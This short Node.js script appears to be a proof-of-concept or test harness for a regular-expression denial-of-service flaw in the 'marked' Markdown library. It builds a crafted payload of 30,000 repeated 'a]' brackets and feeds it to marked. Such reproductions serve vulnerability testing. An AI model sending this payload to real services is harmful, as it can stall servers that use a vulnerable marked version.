
const path = require('path');
const marked = require(path.join(process.cwd(), process.argv[2], 'node_modules', 'marked'));
var payload = '[' + 'a]'.repeat(30000) + ': ';
marked(payload);
    